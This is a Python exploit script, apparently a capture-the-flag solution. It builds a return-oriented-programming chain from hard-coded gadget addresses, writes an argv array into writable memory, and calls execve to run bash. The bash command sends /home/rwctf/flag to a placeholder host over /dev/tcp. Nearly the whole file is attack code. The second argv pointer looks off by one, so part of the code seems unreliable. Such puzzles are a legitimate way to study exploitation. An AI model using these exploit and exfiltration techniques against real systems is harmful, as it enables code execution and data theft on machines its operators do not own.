from struct import pack

p64 = lambda x: pack("Q", x)

# Gadgets
POP_RAX = 0x43FAF0
POP_RDI = 0x4326E3
POP_RDX = 0x4BC1D4
POP_RSI = 0x437FCB
STORE_RAX_INTO_RDI = 0x45F135  # *rdi = rax
SYSCALL = 0x465F30

# More magic constants
EXECVE_SYSCALL_NUM = 0x3B
DATACAVE = 0x554000  # 0x00554000 0x00727000 rw-p [heap]


def store_word(address, word):
    assert isinstance(word, int) or isinstance(word, bytes)
    return [
        POP_RAX,
        word,
        POP_RDI,
        address,
        STORE_RAX_INTO_RDI,
    ]


def store_bytes(address, data):
    if len(data) == 0:
        return []
    elif len(data) < 8:
        return store_bytes(address, data + (b"\x00") * (8 - len(data)))
    else:
        return store_word(address, data[:8]) + store_bytes(address + 8, data[8:])


command_to_run = [
    "/bin/bash",
    "-c",
    "cat</home/rwctf/flag>/dev/tcp/XXX.XXX.XXX.XXX/YYYYY",
]

command_bytes = b"\0".join(x.encode() for x in command_to_run) + b"\0"
command_bytes += b"\0" * (8 - (len(command_bytes) % 8))

chain = (
    # Store the command
    store_bytes(DATACAVE, command_bytes)
    +
    # Assuming `command_to_run` has 3 chunks, store the argv pointers
    store_word(DATACAVE + len(command_bytes), DATACAVE)
    + store_word(DATACAVE + len(command_bytes) + 8, DATACAVE + len(command_to_run[0]))
    + store_word(
        DATACAVE + len(command_bytes) + 16,
        DATACAVE + len(command_to_run[0]) + 2 + len(command_to_run[1]),
    )
    + store_word(DATACAVE + len(command_bytes) + 24, 0)
    +
    # Run execve
    [
        POP_RDI,
        DATACAVE,
        POP_RSI,
        DATACAVE + len(command_bytes),
        POP_RDX,
        0,
        POP_RAX,
        EXECVE_SYSCALL_NUM,
        SYSCALL,
    ]
)

for x in chain:
    assert isinstance(x, int) or isinstance(x, bytes)
    if isinstance(x, bytes):
        assert len(x) == 8

chain = b"".join(p64(x) if isinstance(x, int) else x for x in chain)

print(f"{len(chain)=}")
print(f"{chain=}")
